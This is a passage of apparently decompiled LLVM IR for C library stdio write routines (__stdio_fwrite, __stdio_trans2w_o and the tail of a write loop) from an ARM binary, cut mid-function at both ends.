  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_17dd42 = icmp eq i32 %arg3, 0
  store i1 %v2_17dd42, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_17dd42, label %dec_label_pc_17e74, label %dec_label_pc_17de0

dec_label_pc_17dd4thread-pre-split:               ; preds = %bb22
  %v3_17df8 = load i32, i32* %r7.global-to-local, align 4
  %v5_17df8 = add i32 %v3_17df8, %v4_17dec
  store i32 %v5_17df8, i32* %r7.global-to-local, align 4
  %v5_17dfc = sub i32 %v0_17df4, %v4_17dec
  store i32 %v5_17dfc, i32* %r5.global-to-local, align 4
  %v2_17dd4 = icmp eq i32 %v5_17dfc, 0
  store i1 %v2_17dd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_17dfc, i32* @r2, align 4
  br i1 %v2_17dd4, label %dec_label_pc_17dd4.dec_label_pc_17e74.loopexit_crit_edge, label %dec_label_pc_17de0

dec_label_pc_17de0:                               ; preds = %entry, %dec_label_pc_17dd4thread-pre-split
  %v0_17de4 = phi i32 [ %v5_17df8, %dec_label_pc_17dd4thread-pre-split ], [ %arg2, %entry ]
  %v0_17de0.in = phi i32 [ %v5_17dfc, %dec_label_pc_17dd4thread-pre-split ], [ %arg3, %entry ]
  %v0_17de0 = icmp slt i32 %v0_17de0.in, 0
  br i1 %v0_17de0, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_17de0
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17de0, %bb
  %v0_17de8 = load i32, i32* @r4, align 4
  %v1_17de8 = add i32 %v0_17de8, 4
  %v2_17de8 = inttoptr i32 %v1_17de8 to i32*
  %v3_17de8 = load i32, i32* %v2_17de8, align 4
  store i32 %v3_17de8, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_17de4 to i32*
  %v4_17dec = call i32 @__libc_write(i32 %v3_17de8, i32* %tmp23)
  store i32 %v4_17dec, i32* %r0.global-to-local, align 4
  %v1_17df0 = icmp slt i32 %v4_17dec, 0
  %v2_17df0 = icmp eq i32 %v4_17dec, 0
  store i1 %v2_17df0, i1* %cpsr_z.global-to-local, align 1
  %v0_17df4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17df4, i32* %r6.global-to-local, align 4
  br i1 %v1_17df0, label %dec_label_pc_17e04, label %dec_label_pc_17dd4thread-pre-split

dec_label_pc_17e04:                               ; preds = %bb22
  %v0_17e04 = load i32, i32* @r4, align 4
  %v1_17e04 = inttoptr i32 %v0_17e04 to i32*
  %v2_17e04 = load i32, i32* %v1_17e04, align 4
  store i32 %v2_17e04, i32* %r3.global-to-local, align 4
  %v1_17e08 = add i32 %v0_17e04, 8
  store i32 %v1_17e08, i32* %r0.global-to-local, align 4
  %v1_17e0c = inttoptr i32 %v1_17e08 to i32*
  %v2_17e0c = load i32, i32* %v1_17e0c, align 4
  store i32 %v2_17e0c, i32* %r0.global-to-local, align 4
  %v3_17e0c = add i32 %v0_17e04, 12
  %v4_17e0c = inttoptr i32 %v3_17e0c to i32*
  %v5_17e0c = load i32, i32* %v4_17e0c, align 4
  %v1_17e10 = or i32 %v2_17e04, 8
  store i32 %v1_17e10, i32* %r3.global-to-local, align 4
  %v3_17e14 = sdiv i32 %v2_17e04, 256
  %v2_17e18 = sub i32 %v5_17e0c, %v2_17e0c
  store i32 %v2_17e18, i32* %r2.global-to-local, align 4
  %v9_17e18 = icmp eq i32 %v5_17e0c, %v2_17e0c
  store i1 %v9_17e18, i1* %cpsr_z.global-to-local, align 1
  %v1_17e1c = trunc i32 %v3_17e14 to i8
  %v3_17e1c = add i32 %v0_17e04, 1
  %v4_17e1c = inttoptr i32 %v3_17e1c to i8*
  store i8 %v1_17e1c, i8* %v4_17e1c, align 1
  %v0_17e20 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e20 = trunc i32 %v0_17e20 to i8
  %v2_17e20 = load i32, i32* @r4, align 4
  %v3_17e20 = inttoptr i32 %v2_17e20 to i8*
  store i8 %v1_17e20, i8* %v3_17e20, align 1
  %v0_17e24 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17e24, label %dec_label_pc_17e04.dec_label_pc_17e70_crit_edge, label %dec_label_pc_17e28

dec_label_pc_17e04.dec_label_pc_17e70_crit_edge:  ; preds = %dec_label_pc_17e04
  %v0_17e70.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17e70

dec_label_pc_17e28:                               ; preds = %dec_label_pc_17e04
  %v0_17e28 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e28 = load i32, i32* %r5.global-to-local, align 4
  %v9_17e28 = icmp eq i32 %v0_17e28, %v1_17e28
  store i1 %v9_17e28, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_17e28, %v1_17e28
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_17e28
  store i32 %v0_17e28, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17e28, %bb24
  %v0_17e30.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_17e34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_17e54
  %v2_17e34 = phi i32 [ %v2_17e34.pre, %.preheader ], [ %v1_17e58, %dec_label_pc_17e54 ]
  %v0_17e30 = phi i32 [ %v0_17e30.pre, %.preheader ], [ %v1_17e40, %dec_label_pc_17e54 ]
  %v1_17e30 = inttoptr i32 %v0_17e30 to i8*
  %v2_17e30 = load i8, i8* %v1_17e30, align 1
  %v3_17e30 = zext i8 %v2_17e30 to i32
  store i32 %v3_17e30, i32* %r3.global-to-local, align 4
  %v3_17e34 = inttoptr i32 %v2_17e34 to i8*
  store i8 %v2_17e30, i8* %v3_17e34, align 1
  %v0_17e38 = load i32, i32* %r0.global-to-local, align 4
  %v1_17e38 = inttoptr i32 %v0_17e38 to i8*
  %v2_17e38 = load i8, i8* %v1_17e38, align 1
  %v3_17e38 = zext i8 %v2_17e38 to i32
  store i32 %v3_17e38, i32* %r3.global-to-local, align 4
  %v7_17e3c = icmp eq i8 %v2_17e38, 10
  store i1 %v7_17e3c, i1* %cpsr_z.global-to-local, align 1
  %v0_17e40 = load i32, i32* %r7.global-to-local, align 4
  %v1_17e40 = add i32 %v0_17e40, 1
  store i32 %v1_17e40, i32* %r7.global-to-local, align 4
  br i1 %v7_17e3c, label %dec_label_pc_17e48, label %dec_label_pc_17e54

dec_label_pc_17e48:                               ; preds = %bb25
  %v0_17e48 = load i32, i32* @r4, align 4
  %v1_17e48 = add i32 %v0_17e48, 1
  %v2_17e48 = inttoptr i32 %v1_17e48 to i8*
  %v3_17e48 = load i8, i8* %v2_17e48, align 1
  %v4_17e48 = zext i8 %v3_17e48 to i32
  store i32 %v4_17e48, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_17e48, 2
  %v2_17e4c = icmp eq i8 %tmp30, 0
  store i1 %v2_17e4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e4c, label %dec_label_pc_17e54, label %dec_label_pc_17e60

dec_label_pc_17e54:                               ; preds = %dec_label_pc_17e48, %bb25
  %v0_17e54 = load i32, i32* %r6.global-to-local, align 4
  %v1_17e54 = add i32 %v0_17e54, -1
  store i32 %v1_17e54, i32* %r6.global-to-local, align 4
  %v7_17e54 = icmp eq i32 %v0_17e54, 1
  store i1 %v7_17e54, i1* %cpsr_z.global-to-local, align 1
  %v1_17e58 = add i32 %v0_17e38, 1
  store i32 %v1_17e58, i32* %r0.global-to-local, align 4
  br i1 %v7_17e54, label %dec_label_pc_17e54.dec_label_pc_17e60_crit_edge, label %bb25

dec_label_pc_17e54.dec_label_pc_17e60_crit_edge:  ; preds = %dec_label_pc_17e54
  %v0_17e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e60:                               ; preds = %dec_label_pc_17e48, %dec_label_pc_17e54.dec_label_pc_17e60_crit_edge
  %v0_17e64 = phi i32 [ %v1_17e58, %dec_label_pc_17e54.dec_label_pc_17e60_crit_edge ], [ %v0_17e38, %dec_label_pc_17e48 ]
  %v0_17e60 = phi i32 [ %v0_17e60.pre, %dec_label_pc_17e54.dec_label_pc_17e60_crit_edge ], [ %v0_17e48, %dec_label_pc_17e48 ]
  %v1_17e60 = add i32 %v0_17e60, 8
  %v2_17e60 = inttoptr i32 %v1_17e60 to i32*
  %v3_17e60 = load i32, i32* %v2_17e60, align 4
  store i32 %v3_17e60, i32* %r3.global-to-local, align 4
  %v2_17e64 = add i32 %v0_17e60, 16
  %v3_17e64 = inttoptr i32 %v2_17e64 to i32*
  store i32 %v0_17e64, i32* %v3_17e64, align 4
  %v0_17e68 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e68 = load i32, i32* %r0.global-to-local, align 4
  %v2_17e68 = sub i32 %v1_17e68, %v0_17e68
  store i32 %v2_17e68, i32* %r3.global-to-local, align 4
  %v1_17e6c = load i32, i32* %r5.global-to-local, align 4
  %v2_17e6c = sub i32 %v1_17e6c, %v2_17e68
  store i32 %v2_17e6c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17e70

dec_label_pc_17e70:                               ; preds = %dec_label_pc_17e04.dec_label_pc_17e70_crit_edge, %dec_label_pc_17e60
  %v0_17e70 = phi i32 [ %v0_17e70.pre, %dec_label_pc_17e04.dec_label_pc_17e70_crit_edge ], [ %v2_17e6c, %dec_label_pc_17e60 ]
  %v1_17e70 = load i32, i32* %r8.global-to-local, align 4
  %v2_17e70 = sub i32 %v1_17e70, %v0_17e70
  store i32 %v2_17e70, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17e74

dec_label_pc_17dd4.dec_label_pc_17e74.loopexit_crit_edge: ; preds = %dec_label_pc_17dd4thread-pre-split
  %v0_17e74.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %entry, %dec_label_pc_17dd4.dec_label_pc_17e74.loopexit_crit_edge, %dec_label_pc_17e70
  %v0_17e74 = phi i32 [ %v2_17e70, %dec_label_pc_17e70 ], [ %v0_17e74.pre.pre, %dec_label_pc_17dd4.dec_label_pc_17e74.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_17e74, i32* %r0.global-to-local, align 4
  ret i32 %v0_17e74

; uselistorder directives
  uselistorder i32 %v0_17e74, { 1, 0 }
  uselistorder i32 %v0_17e60, { 1, 0 }
  uselistorder i32 %v1_17e58, { 0, 2, 1 }
  uselistorder i32 %v0_17e54, { 1, 0 }
  uselistorder i1 %v2_17e4c, { 1, 0 }
  uselistorder i32 %v1_17e40, { 1, 0 }
  uselistorder i32 %v0_17e28, { 1, 0, 2 }
  uselistorder i32 %v5_17e0c, { 1, 0 }
  uselistorder i32 %v2_17e0c, { 1, 0, 2 }
  uselistorder i32 %v0_17df4, { 1, 0 }
  uselistorder i32 %v4_17dec, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_17dfc, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17e74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17e70, { 1, 0 }
  uselistorder label %dec_label_pc_17e60, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_17de0, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17e7c = load i32, i32* @r4, align 4
  store i32 %v3_17e7c, i32* %stack_var_-20, align 4
  %v6_17e7c = load i32, i32* @r5, align 4
  %v9_17e7c = load i32, i32* @r6, align 4
  %v12_17e7c = load i32, i32* @r7, align 4
  %v15_17e7c = load i32, i32* @lr, align 4
  %v1_17e80 = add i32 %arg3, 1
  %v2_17e80 = inttoptr i32 %v1_17e80 to i8*
  %v3_17e80 = load i8, i8* %v2_17e80, align 1
  %v4_17e80 = zext i8 %v3_17e80 to i32
  %v3_17e84 = mul nuw nsw i32 %v4_17e80, 256
  %v1_17e88 = and i32 %v3_17e84, 512
  store i32 %v1_17e88, i32* @r4, align 4
  %v2_17e88 = icmp eq i32 %v1_17e88, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_17e88, label %dec_label_pc_17e9c, label %dec_label_pc_17f98

dec_label_pc_17e9c:                               ; preds = %entry
  %v1_17e9c = add i32 %arg3, 4
  %v2_17e9c = inttoptr i32 %v1_17e9c to i32*
  %v3_17e9c = load i32, i32* %v2_17e9c, align 4
  %v1_17ea4 = add i32 %arg3, 16
  %v2_17ea4 = inttoptr i32 %v1_17ea4 to i32*
  %v3_17ea4 = load i32, i32* %v2_17ea4, align 4
  store i32 %v3_17ea4, i32* @r0, align 4
  %v1_17ea8 = add i32 %arg3, 12
  %v2_17ea8 = inttoptr i32 %v1_17ea8 to i32*
  %v3_17ea8 = load i32, i32* %v2_17ea8, align 4
  %v4_17eac = icmp eq i32 %v3_17e9c, -2
  %v2_17eb0 = sub i32 %v3_17ea8, %v3_17ea4
  br i1 %v4_17eac, label %dec_label_pc_17eb0, label %dec_label_pc_17ed8

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17e9c
  %v3_17eb4 = icmp ugt i32 %v2_17eb0, %arg2
  br i1 %v3_17eb4, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_17eb0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17eb0, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_17eb0, %dec_label_pc_17eb0 ]
  %v0_17ebc = phi i32 [ %arg2, %bb ], [ %v2_17eb0, %dec_label_pc_17eb0 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_17ebc, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17ec4 = call i32 @memcpy()
  %v0_17ec8 = load i32, i32* @r5, align 4
  %v1_17ec8 = add i32 %v0_17ec8, 16
  %v2_17ec8 = inttoptr i32 %v1_17ec8 to i32*
  %v3_17ec8 = load i32, i32* %v2_17ec8, align 4
  %v1_17ecc = load i32, i32* @r4, align 4
  %v2_17ecc = add i32 %v1_17ecc, %v3_17ec8
  store i32 %v2_17ecc, i32* %v2_17ec8, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17ed8:                               ; preds = %dec_label_pc_17e9c
  %tmp = icmp ult i32 %v2_17eb0, %arg2
  br i1 %tmp, label %dec_label_pc_17f78, label %dec_label_pc_17ee4

dec_label_pc_17ee4:                               ; preds = %dec_label_pc_17ed8
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17eec = call i32 @memcpy()
  %v0_17ef0 = load i32, i32* @r5, align 4
  %v1_17ef0 = add i32 %v0_17ef0, 16
  %v2_17ef0 = inttoptr i32 %v1_17ef0 to i32*
  %v3_17ef0 = load i32, i32* %v2_17ef0, align 4
  %v1_17ef4 = add i32 %v0_17ef0, 1
  %v2_17ef4 = inttoptr i32 %v1_17ef4 to i8*
  %v3_17ef4 = load i8, i8* %v2_17ef4, align 1
  %v1_17ef8 = load i32, i32* @r6, align 4
  %v2_17ef8 = add i32 %v1_17ef8, %v3_17ef0
  %tmp17 = urem i8 %v3_17ef4, 2
  %v2_17efc = icmp eq i8 %tmp17, 0
  store i32 %v2_17ef8, i32* %v2_17ef0, align 4
  br i1 %v2_17efc, label %dec_label_pc_17fac, label %dec_label_pc_17f08

dec_label_pc_17f08:                               ; preds = %dec_label_pc_17ee4
  %v0_17f08 = load i32, i32* %r7.global-to-local, align 4
  %v0_17f10 = load i32, i32* @r6, align 4
  %v4_17f14 = call i32 @memrchr(i32 %v0_17f08, i32 10, i32 %v0_17f10, i32 %v2_17ef8)
  %v2_17f18 = icmp eq i32 %v4_17f14, 0
  br i1 %v2_17f18, label %dec_label_pc_17fac, label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %dec_label_pc_17f08
  %v0_17f20 = load i32, i32* @r5, align 4
  store i32 %v0_17f20, i32* @r0, align 4
  %v0_17f24 = call i32 @__stdio_wcommit()
  %v2_17f28 = icmp eq i32 %v0_17f24, 0
  br i1 %v2_17f28, label %dec_label_pc_17fac, label %dec_label_pc_17f30

dec_label_pc_17f30:                               ; preds = %dec_label_pc_17f20
  %v0_17f30 = load i32, i32* @r6, align 4
  %v3_17f30 = icmp uge i32 %v0_17f30, %v0_17f24
  %v0_17f24.v0_17f30 = select i1 %v3_17f30, i32 %v0_17f24, i32 %v0_17f30
  store i32 %v0_17f24.v0_17f30, i32* @r4, align 4
  %v2_17f3c = sub i32 %v0_17f30, %v0_17f24.v0_17f30
  %v0_17f40 = load i32, i32* %r7.global-to-local, align 4
  %v2_17f40 = add i32 %v0_17f40, %v2_17f3c
  store i32 %v2_17f40, i32* %r7.global-to-local, align 4
  store i32 %v0_17f24.v0_17f30, i32* @r2, align 4
  %v4_17f50 = call i32 @__GI_memchr(i32 %v2_17f40, i32 10, i32 %v0_17f24.v0_17f30, i32 %v2_17f3c)
  %v2_17f54 = icmp eq i32 %v4_17f50, 0
  br i1 %v2_17f54, label %dec_label_pc_17fac, label %dec_label_pc_17f5c

dec_label_pc_17f5c:                               ; preds = %dec_label_pc_17f30
  %v0_17f5c = load i32, i32* @r5, align 4
  %v1_17f5c = add i32 %v0_17f5c, 16
  %v2_17f5c = inttoptr i32 %v1_17f5c to i32*
  %v3_17f5c = load i32, i32* %v2_17f5c, align 4
  %v0_17f60 = load i32, i32* %r7.global-to-local, align 4
  %v1_17f60 = load i32, i32* @r4, align 4
  %v2_17f60 = sub i32 %v0_17f60, %v4_17f50
  %v2_17f64 = add i32 %v2_17f60, %v1_17f60
  %v2_17f68 = sub i32 %v3_17f5c, %v2_17f64
  %v1_17f6c = load i32, i32* @r6, align 4
  %v2_17f6c = sub i32 %v1_17f6c, %v2_17f64
  store i32 %v2_17f6c, i32* @r6, align 4
  store i32 %v2_17f68, i32* %v2_17f5c, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17f78:                               ; preds = %dec_label_pc_17ed8
  %v1_17f78 = add i32 %arg3, 8
  %v2_17f78 = inttoptr i32 %v1_17f78 to i32*
  %v3_17f78 = load i32, i32* %v2_17f78, align 4
  %v9_17f7c = icmp eq i32 %v3_17ea4, %v3_17f78
  br i1 %v9_17f7c, label %dec_label_pc_17f98, label %dec_label_pc_17f84

dec_label_pc_17f84:                               ; preds = %dec_label_pc_17f78
  store i32 %arg3, i32* @r0, align 4
  %v0_17f88 = call i32 @__stdio_wcommit()
  %v2_17f8c = icmp eq i32 %v0_17f88, 0
  br i1 %v2_17f8c, label %dec_label_pc_17f84.dec_label_pc_17f98_crit_edge, label %bb13

dec_label_pc_17f84.dec_label_pc_17f98_crit_edge:  ; preds = %dec_label_pc_17f84
  %v0_17fa0.pre = load i32, i32* @r6, align 4
  %v0_17f98.pre = load i32, i32* @r5, align 4
  %v0_17f9c.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_17fa4.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_17f98

bb13:                                             ; preds = %dec_label_pc_17f84
  %v1_17f90 = load i32, i32* @r4, align 4
  store i32 %v1_17f90, i32* @r6, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17f98:                               ; preds = %dec_label_pc_17f84.dec_label_pc_17f98_crit_edge, %entry, %dec_label_pc_17f78
  %v2_17fa4 = phi i32 [ %v2_17fa4.pre, %dec_label_pc_17f84.dec_label_pc_17f98_crit_edge ], [ %v3_17e7c, %entry ], [ %v3_17e7c, %dec_label_pc_17f78 ]
  %v0_17f9c = phi i32 [ %v0_17f9c.pre, %dec_label_pc_17f84.dec_label_pc_17f98_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_17f78 ]
  %v0_17f98 = phi i32 [ %v0_17f98.pre, %dec_label_pc_17f84.dec_label_pc_17f98_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_17f78 ]
  %v0_17fa0 = phi i32 [ %v0_17fa0.pre, %dec_label_pc_17f84.dec_label_pc_17f98_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_17f78 ]
  store i32 %v2_17fa4, i32* @r4, align 4
  store i32 %v9_17e7c, i32* @r6, align 4
  store i32 %v15_17e7c, i32* @lr, align 4
  %v3_17fa8 = inttoptr i32 %v0_17f98 to i8*
  %v4_17fa8 = call i32 @__stdio_WRITE(i8* %v3_17fa8, i32 %v0_17f9c, i32 %v0_17fa0)
  br label %dec_label_pc_17fac

dec_label_pc_17fac:                               ; preds = %bb13, %dec_label_pc_17f30, %dec_label_pc_17f20, %dec_label_pc_17f08, %dec_label_pc_17ee4, %dec_label_pc_17f5c, %bb10, %dec_label_pc_17f98
  %v0_17fac = load i32, i32* @r6, align 4
  %v2_17fb0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17fb0, i32* @r4, align 4
  store i32 %v6_17e7c, i32* @r5, align 4
  store i32 %v9_17e7c, i32* @r6, align 4
  store i32 %v12_17e7c, i32* @r7, align 4
  ret i32 %v0_17fac

; uselistorder directives
  uselistorder i32 %v2_17f64, { 1, 0 }
  uselistorder i32 %v2_17f3c, { 1, 0 }
  uselistorder i32 %v0_17f24.v0_17f30, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17f30, { 1, 0, 2 }
  uselistorder i32 %v2_17eb0, { 2, 0, 1, 3 }
  uselistorder i32 %v9_17e7c, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 6, 8, 7, 4, 5, 3 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_17fac, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_17f98, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17fb4 = load i32, i32* @r4, align 4
  store i32 %v3_17fb4, i32* %stack_var_-8, align 4
  %v3_17fb8 = load i8, i8* %arg1, align 1
  %v4_17fb8 = zext i8 %v3_17fb8 to i32
  store i32 %v4_17fb8, i32* %r2.global-to-local, align 4
  %v2_17fbc = add i32 %tmp, 1
  %v3_17fbc = inttoptr i32 %v2_17fbc to i8*
  %v4_17fbc = load i8, i8* %v3_17fbc, align 1
  %v5_17fbc = zext i8 %v4_17fbc to i32
  store i32 %v5_17fbc, i32* %r3.global-to-local, align 4
  %v4_17fc0 = mul nuw nsw i32 %v5_17fbc, 256
  %v5_17fc0 = or i32 %v4_17fc0, %v4_17fb8
  store i32 %v5_17fc0, i32* %r2.global-to-local, align 4
  %v2_17fc4 = and i32 %v5_17fc0, %arg2
  %v4_17fc4 = icmp eq i32 %v2_17fc4, 0
  store i1 %v4_17fc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_17fc4, label %dec_label_pc_17fd0, label %dec_label_pc_17fe8

dec_label_pc_17fd0:                               ; preds = %entry
  %v1_17fd0 = and i32 %v5_17fc0, 2176
  %v2_17fd0 = icmp eq i32 %v1_17fd0, 0
  store i1 %v2_17fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fd0, label %dec_label_pc_17fd8, label %dec_label_pc_17ffc

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fd0
  %v2_17fd8 = or i32 %v5_17fc0, %arg2
  store i32 %v2_17fd8, i32* %r2.global-to-local, align 4
  %v3_17fdc = sdiv i32 %v2_17fd8, 256
  store i32 %v3_17fdc, i32* %r3.global-to-local, align 4
  %v1_17fe0 = trunc i32 %v3_17fdc to i8
  store i8 %v1_17fe0, i8* %v3_17fbc, align 1
  %v0_17fe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fe4 = trunc i32 %v0_17fe4 to i8
  store i8 %v1_17fe4, i8* %arg1, align 1
  %v0_17fe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fe8

dec_label_pc_17fe8:                               ; preds = %entry, %dec_label_pc_17fd8
  %v0_18034 = phi i32 [ %tmp, %entry ], [ %v0_17fe8.pre, %dec_label_pc_17fd8 ]
  %v1_17fe8 = inttoptr i32 %v0_18034 to i8*
  %v2_17fe8 = load i8, i8* %v1_17fe8, align 1
  %v3_17fe8 = zext i8 %v2_17fe8 to i32
  store i32 %v3_17fe8, i32* %r2.global-to-local, align 4
  %v1_17fec = add i32 %v0_18034, 1
  %v2_17fec = inttoptr i32 %v1_17fec to i8*
  %v3_17fec = load i8, i8* %v2_17fec, align 1
  %v4_17fec = zext i8 %v3_17fec to i32
  store i32 %v4_17fec, i32* %r3.global-to-local, align 4
  %v4_17ff0 = mul nuw nsw i32 %v4_17fec, 256
  %v1_17ff4 = and i32 %v3_17fe8, 32
  %v2_17ff4 = icmp eq i32 %v1_17ff4, 0
  store i1 %v2_17ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ff4, label %dec_label_pc_18024, label %dec_label_pc_17ffc

dec_label_pc_17ffc:                               ; preds = %dec_label_pc_17fd0, %dec_label_pc_17fe8
  %v0_17ffc = call i32 @__errno_location()
  store i32 %v0_17ffc, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_18004 = inttoptr i32 %v0_17ffc to i32*
  store i32 9, i32* %v2_18004, align 4
  br label %dec_label_pc_18008

dec_label_pc_18008:                               ; preds = %dec_label_pc_1804c, %dec_label_pc_17ffc
  %v0_18008 = load i32, i32* @r4, align 4
  %v1_18008 = inttoptr i32 %v0_18008 to i32*
  %v2_18008 = load i32, i32* %v1_18008, align 4
  %v1_1800c = or i32 %v2_18008, 8
  store i32 %v1_1800c, i32* %r3.global-to-local, align 4
  %v3_18010 = sdiv i32 %v2_18008, 256
  store i32 %v3_18010, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18018 = trunc i32 %v3_18010 to i8
  %v3_18018 = add i32 %v0_18008, 1
  %v4_18018 = inttoptr i32 %v3_18018 to i8*
  store i8 %v1_18018, i8* %v4_18018, align 1
  %v0_1801c = load i32, i32* %r3.global-to-local, align 4
  %v1_1801c = trunc i32 %v0_1801c to i8
  %v2_1801c = load i32, i32* @r4, align 4
  %v3_1801c = inttoptr i32 %v2_1801c to i8*
  store i8 %v1_1801c, i8* %v3_1801c, align 1
  %v2_18020 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18020, i32* @r4, align 4
  ret i32 -1

dec_label_pc_18024:                               ; preds = %dec_label_pc_17fe8
  %tmp15 = urem i8 %v2_17fe8, 4
  %v2_18024 = icmp eq i8 %tmp15, 0
  store i1 %v2_18024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18024, label %dec_label_pc_18088, label %dec_label_pc_1802c

dec_label_pc_1802c:                               ; preds = %dec_label_pc_18024
  %v1_1802c = and i32 %v3_17fe8, 4
  store i32 %v1_1802c, i32* @r1, align 4
  %v2_1802c = icmp eq i32 %v1_1802c, 0
  store i1 %v2_1802c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1802c, label %dec_label_pc_18034, label %dec_label_pc_18064

dec_label_pc_18034:                               ; preds = %dec_label_pc_1802c
  %v1_18034 = add i32 %v0_18034, 20
  %v2_18034 = inttoptr i32 %v1_18034 to i32*
  %v3_18034 = load i32, i32* %v2_18034, align 4
  store i32 %v3_18034, i32* %r2.global-to-local, align 4
  %v1_18038 = add i32 %v0_18034, 16
  %v2_18038 = inttoptr i32 %v1_18038 to i32*
  %v3_18038 = load i32, i32* %v2_18038, align 4
  store i32 %v3_18038, i32* %r3.global-to-local, align 4
  %v9_1803c = icmp eq i32 %v3_18034, %v3_18038
  store i1 %v9_1803c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1803c, label %dec_label_pc_18044, label %dec_label_pc_1804c

dec_label_pc_18044:                               ; preds = %dec_label_pc_18034
